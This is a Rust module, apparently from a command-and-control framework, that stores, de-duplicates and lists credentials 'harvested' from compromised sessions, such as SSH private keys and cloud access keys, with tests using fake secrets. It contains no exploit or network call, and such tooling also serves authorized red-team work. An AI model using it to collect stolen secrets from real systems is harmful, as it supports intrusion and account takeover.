use std::sync::{Arc, Mutex};

use serde::{Deserialize, Serialize};
use sqlx::SqlitePool;

/// A harvested credential record.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Credential {
    pub id: String,
    pub source: String,
    pub cred_type: String,
    pub session_id: String,
    /// Identifying label: a path, `user@host`, or service name.
    pub identifier: String,
    /// The recovered secret material.
    pub secret: String,
}

/// Credential store. Persists to SQLite when a pool is configured and always
/// keeps an in-memory mirror so the operator `creds` listing is served from
/// memory on the hot path.
#[derive(Clone)]
pub struct CredentialStore {
    pool: Option<SqlitePool>,
    mem: Arc<Mutex<Vec<Credential>>>,
}

impl Default for CredentialStore {
    fn default() -> Self {
        Self {
            pool: None,
            mem: Arc::new(Mutex::new(Vec::new())),
        }
    }
}

impl CredentialStore {
    /// Create a store backed by the given SQLite pool.
    pub fn new(pool: SqlitePool) -> Self {
        Self {
            pool: Some(pool),
            mem: Arc::new(Mutex::new(Vec::new())),
        }
    }

    /// Create a store with no persistence (purely in-memory).
    pub fn new_in_memory() -> Self {
        Self::default()
    }

    /// Store one credential, de-duplicating on (session, source, type, id).
    pub async fn store(&self, cred: Credential) {
        let key = (
            cred.session_id.clone(),
            cred.source.clone(),
            cred.cred_type.clone(),
            cred.identifier.clone(),
        );
        {
            let mut mem = self.mem.lock().expect("cred store");
            // Replace an identical entry rather than accumulating duplicates
            // when an operator re-harvests the same target.
            if let Some(existing) = mem.iter_mut().find(|c| {
                (
                    c.session_id.clone(),
                    c.source.clone(),
                    c.cred_type.clone(),
                    c.identifier.clone(),
                ) == key
            }) {
                existing.secret = cred.secret.clone();
            } else {
                mem.push(cred.clone());
            }
        }

        if let Some(pool) = &self.pool {
            let _ = sqlx::query(
                "INSERT OR REPLACE INTO c2_creds \
                 (id, session_id, source, cred_type, identifier, secret) \
                 VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
            )
            .bind(&cred.id)
            .bind(&cred.session_id)
            .bind(&cred.source)
            .bind(&cred.cred_type)
            .bind(&cred.identifier)
            .bind(&cred.secret)
            .execute(pool)
            .await;
        }
    }

    /// List credentials harvested for a specific session.
    pub async fn list(&self, sid: &str) -> Vec<Credential> {
        let mem: Vec<Credential> = self
            .mem
            .lock()
            .expect("cred store")
            .iter()
            .filter(|c| c.session_id == sid)
            .cloned()
            .collect();
        if !mem.is_empty() {
            return mem;
        }
        self.list_from_db(sid).await
    }

    /// List all harvested credentials (admin only).
    pub async fn list_all(&self) -> Vec<Credential> {
        let mem: Vec<Credential> = self.mem.lock().expect("cred store").clone();
        if !mem.is_empty() {
            return mem;
        }
        self.list_from_db("").await
    }

    /// Read from SQLite. An empty `sid` lists every session.
    async fn list_from_db(&self, sid: &str) -> Vec<Credential> {
        let Some(pool) = &self.pool else {
            return Vec::new();
        };
        let rows = if sid.is_empty() {
            sqlx::query(
                "SELECT id, session_id, source, cred_type, identifier, secret \
                 FROM c2_creds ORDER BY created_at DESC",
            )
            .fetch_all(pool)
            .await
        } else {
            sqlx::query(
                "SELECT id, session_id, source, cred_type, identifier, secret \
                 FROM c2_creds WHERE session_id = ?1 ORDER BY created_at DESC",
            )
            .bind(sid)
            .fetch_all(pool)
            .await
        };
        let Ok(rows) = rows else {
            return Vec::new();
        };
        use sqlx::Row;
        rows.into_iter()
            .filter_map(|r| {
                Some(Credential {
                    id: r.try_get("id").ok()?,
                    session_id: r.try_get("session_id").ok()?,
                    source: r.try_get("source").ok()?,
                    cred_type: r.try_get("cred_type").ok()?,
                    identifier: r.try_get("identifier").ok()?,
                    secret: r.try_get("secret").ok()?,
                })
            })
            .collect()
    }

    /// Build a store entry id that is stable across re-harvests of the same
    /// (session, source, type, identifier) tuple.
    pub fn entry_id(session_id: &str, source: &str, cred_type: &str, identifier: &str) -> String {
        format!("{session_id}:{source}:{cred_type}:{identifier}")
    }
}

pub type SharedCredStore = Arc<CredentialStore>;

#[cfg(test)]
mod tests {
    use super::*;

    fn cred(session: &str, source: &str, id: &str, secret: &str) -> Credential {
        Credential {
            id: CredentialStore::entry_id(session, source, "hash", id),
            source: source.to_owned(),
            cred_type: "hash".to_owned(),
            session_id: session.to_owned(),
            identifier: id.to_owned(),
            secret: secret.to_owned(),
        }
    }

    #[tokio::test]
    async fn stores_and_lists_by_session() {
        let store = CredentialStore::new_in_memory();
        store
            .store(cred("s1", "ssh-key", "/root/.ssh/id_rsa", "KEY"))
            .await;
        store
            .store(cred("s2", "cloud-aws", "default/key", "AKIA"))
            .await;

        let for_s1 = store.list("s1").await;
        assert_eq!(for_s1.len(), 1);
        assert_eq!(for_s1[0].identifier, "/root/.ssh/id_rsa");
        assert_eq!(store.list_all().await.len(), 2);
    }

    #[tokio::test]
    async fn reharvest_replaces_rather_than_duplicating() {
        let store = CredentialStore::new_in_memory();
        store
            .store(cred("s1", "ssh-key", "/root/.ssh/id_rsa", "OLD"))
            .await;
        store
            .store(cred("s1", "ssh-key", "/root/.ssh/id_rsa", "NEW"))
            .await;
        let all = store.list_all().await;
        assert_eq!(all.len(), 1, "re-harvest must not duplicate");
        assert_eq!(all[0].secret, "NEW");
    }

    #[tokio::test]
    async fn empty_store_lists_nothing() {
        let store = CredentialStore::new_in_memory();
        assert!(store.list("nope").await.is_empty());
        assert!(store.list_all().await.is_empty());
    }

    #[test]
    fn entry_id_is_stable_and_distinct() {
        let a = CredentialStore::entry_id("s", "src", "t", "i");
        let b = CredentialStore::entry_id("s", "src", "t", "i");
        let c = CredentialStore::entry_id("s", "src", "t", "other");
        assert_eq!(a, b);
        assert_ne!(a, c);
    }
}
